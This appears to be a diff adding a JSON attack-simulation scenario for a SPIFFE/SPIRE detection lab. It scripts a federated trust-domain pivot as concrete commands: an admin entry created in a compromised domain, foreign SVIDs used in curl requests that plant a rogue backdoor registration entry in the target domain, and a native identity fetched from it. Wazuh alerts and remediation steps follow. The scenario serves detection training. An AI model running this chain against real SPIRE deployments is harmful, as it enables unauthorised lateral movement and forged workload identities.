@@ -1,0 +1,252 @@
+{
+  "id": "S7-12",
+  "name": "Nested Trust Domain Pivot",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Chain a federation trust relationship to pivot from one domain to another: compromise evil.org federation, create entries in evil.org, then use federated SVIDs to authenticate to example.org's SPIRE Server API and create rogue registration entries in the target domain. This is a full lateral movement chain across trust domain boundaries.",
+  "difficulty": "Expert",
+  "real_world_relevance": "Multi-hop trust domain pivoting mirrors real-world attacks where a compromised partner organization is used as a stepping stone into a target's infrastructure. The 2023 Okta breach demonstrated how identity provider compromise enables cascading access across organizational boundaries. In SPIRE deployments, if the Server API accepts federated authentication, an attacker controlling one domain can manipulate registration entries in another.",
+
+  "mitre_attack": {
+    "tactics": ["Lateral Movement", "Persistence", "Credential Access"],
+    "techniques": [
+      {"id": "T1199", "name": "Trusted Relationship"},
+      {"id": "T1021", "name": "Remote Services"},
+      {"id": "T1098", "name": "Account Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-server", "spire-server-evil", "spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "federation"
+  },
+
+  "attack_flow": {
+    "description": "Attacker chains federation trust to pivot from evil.org into example.org by using federated SVIDs to authenticate to the target SPIRE Server API and create rogue entries",
+    "diagram": [
+      "1. Attacker has compromised evil.org SPIRE server (full admin access)",
+      "2. Federation trust is established between example.org and evil.org",
+      "3. Attacker creates an entry in evil.org matching selectors on example.org's agent node",
+      "4. Fetches evil.org SVID and uses it to authenticate to example.org SPIRE Server API",
+      "5. If API accepts federated auth: attacker creates rogue entries directly in example.org",
+      "6. Rogue entries grant attacker-controlled workloads legitimate example.org SVIDs",
+      "7. Full lateral movement achieved — attacker now has native example.org identities"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Federation Reconnaissance",
+      "description": "Enumerate federation relationships and identify API authentication mechanisms on the target domain",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server bundle list -socketPath /tmp/spire-server/private/api.sock",
+          "description": "List federated bundles to confirm trust relationship with example.org"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server entry show -socketPath /tmp/spire-server/private/api.sock",
+          "description": "List all entries in evil.org to understand current configuration"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server",
+          "command": "cat /opt/spire/conf/server/server.conf | grep -A5 'admin_ids\\|federation\\|authorized_delegates'",
+          "description": "Check if example.org SPIRE server accepts federated identities for API auth"
+        }
+      ]
+    },
+    {
+      "name": "Evil Domain Entry Creation",
+      "description": "Create entries in evil.org that will grant SVIDs usable for authenticating to example.org's API",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server entry create -parentID spiffe://evil.org/spire/agent/x509pop/evil-agent -spiffeID spiffe://evil.org/admin-impersonator -selector unix:uid:0 -admin -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create admin entry in evil.org — SVID will be used to authenticate to target API"
+        },
+        {
+          "type": "exec",
+          "target": "spire-server-evil",
+          "command": "/opt/spire/bin/spire-server entry create -parentID spiffe://evil.org/spire/agent/x509pop/evil-agent -spiffeID spiffe://evil.org/api-caller -selector unix:uid:0 -federatesWith spiffe://example.org -socketPath /tmp/spire-server/private/api.sock",
+          "description": "Create federated entry targeting example.org with federation directive"
+        }
+      ]
+    },
+    {
+      "name": "Cross-Domain SVID Acquisition",
+      "description": "Fetch SVIDs from evil.org agent that include the federated trust bundle for example.org",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/evil-svids/",
+          "description": "Fetch X.509 SVID from evil.org including federated bundle"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "openssl x509 -in /tmp/evil-svids/svid.0.pem -text -noout | grep -E 'URI:|Subject:'",
+          "description": "Verify SVID identity — should show spiffe://evil.org/admin-impersonator"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent api fetch jwt -audience spire-server-api -socketPath /opt/spire/sockets/workload_api.sock",
+          "description": "Fetch JWT-SVID for API authentication to example.org server"
+        }
+      ]
+    },
+    {
+      "name": "Target Domain API Authentication",
+      "description": "Use the evil.org SVID to authenticate to example.org's SPIRE Server Registration API",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -k --cert /tmp/evil-svids/svid.0.pem --key /tmp/evil-svids/svid.0.key --cacert /tmp/evil-svids/bundle.0.pem https://spire-server:8081/v1/entries -H 'Content-Type: application/json'",
+          "description": "Attempt to list entries on example.org SPIRE server using evil.org mTLS SVID"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "curl -k --cert /tmp/evil-svids/svid.0.pem --key /tmp/evil-svids/svid.0.key --cacert /tmp/evil-svids/bundle.0.pem https://spire-server:8081/v1/entries -X POST -H 'Content-Type: application/json' -d '{\"entries\": [{\"spiffe_id\": {\"trust_domain\": \"example.org\", \"path\": \"/attacker-backdoor\"}, \"parent_id\": {\"trust_domain\": \"example.org\", \"path\": \"/spire/agent/x509pop/k8s-node-1\"}, \"selectors\": [{\"type\": \"unix\", \"value\": \"uid:0\"}]}]}'",
+          "description": "Create rogue entry in example.org via federated API auth — this is the pivot"
+        }
+      ]
+    },
+    {
+      "name": "Native Identity Acquisition",
+      "description": "Fetch the rogue example.org SVID created through the pivot — attacker now has a native identity",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/rogue-svids/",
+          "description": "Fetch SVIDs — should now include spiffe://example.org/attacker-backdoor"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "openssl x509 -in /tmp/rogue-svids/svid.0.pem -text -noout | grep 'URI:'",
+          "description": "Confirm SVID is a native example.org identity — pivot complete"
+        }
+      ]
+    },
+    {
+      "name": "Detection Confirmation",
+      "description": "Run monitoring to detect cross-domain entry manipulation",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "python3 /opt/spire-monitor/spire_identity_monitor.py",
+          "description": "Run SPIRE identity monitor to detect cross-domain entry creation and federation pivot"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Federation bundle imported — new trust relationship with evil.org established",
+      "wazuh_rule": "101090"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Cross-domain SVID fetch — workload received identity from federated domain",
+      "wazuh_rule": "101091"
+    },
+    {
+      "type": "SPIRE Server Audit",
+      "description": "Registration entry created in example.org — potentially by federated caller",
+      "wazuh_rule": "101020"
+    },
+    {
+      "type": "SPIRE Server API",
+      "description": "Entry creation request authenticated by SVID from foreign trust domain",
+      "wazuh_rule": "101092"
+    },
+    {
+      "type": "SPIRE Identity Monitor",
+      "description": "New registration entry created by cross-domain authenticated caller",
+      "wazuh_rule": "101007"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101090",
+      "level": 14,
+      "description": "NHI: SPIRE federation bundle imported — new trust domain added"
+    },
+    {
+      "rule_id": "101091",
+      "level": 13,
+      "description": "NHI: Cross-domain SVID fetch — federated identity used"
+    },
+    {
+      "rule_id": "101020",
+      "level": 12,
+      "description": "NHI: SPIRE registration entry created"
+    },
+    {
+      "rule_id": "101092",
+      "level": 15,
+      "description": "NHI: Cross-domain entry manipulation — federated caller created entry in target domain"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke all SVIDs issued through rogue registration entries in example.org",
+      "Delete rogue entries created via the federated API authentication",
+      "Remove evil.org federation bundle from example.org SPIRE server",
+      "Rotate all agent attestation credentials on affected nodes",
+      "Audit SPIRE Server API access logs for federated authentication attempts"
+    ],
+    "long_term": [
+      "Never allow federated SVIDs to authenticate to the SPIRE Server Registration API — use separate admin credentials",
+      "Implement strict admin_ids allowlists in SPIRE server configuration",
+      "Deploy SPIRE Server behind an API gateway with identity-based access control",
+      "Require multi-party approval for federation bundle imports",
+      "Implement real-time monitoring of registration entry creation with caller identity tracking",
+      "Use SPIRE's UpstreamAuthority plugin with certificate constraints to limit cross-domain entry creation",
+      "Segment SPIRE Server management plane from workload data plane"
+    ]
+  },
+
+  "demo_script": {
+    "container": "spire-server",
+    "commands": [
+      "scripts/talk/demo-spiffe-nested-pivot.sh"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIFFE Federation Specification",
+      "url": "https://github.com/spiffe/spiffe/blob/main/standards/SPIFFE_Federation.md"
+    },
+    {
+      "title": "SPIRE Server API Authentication",
+      "url": "https://spiffe.io/docs/latest/deploying/configuring/#server-configuration"
+    },
+    {
+      "title": "Okta Breach 2023 — Cascading Identity Provider Compromise",
+      "url": "https://sec.okta.com/articles/2023/10/tracking-unauthorized-access-oktas-support-system"
+    },
+    {
+      "title": "MITRE ATT&CK T1199 — Trusted Relationship",
+      "url": "https://attack.mitre.org/techniques/T1199/"
+    }
+  ]
+}
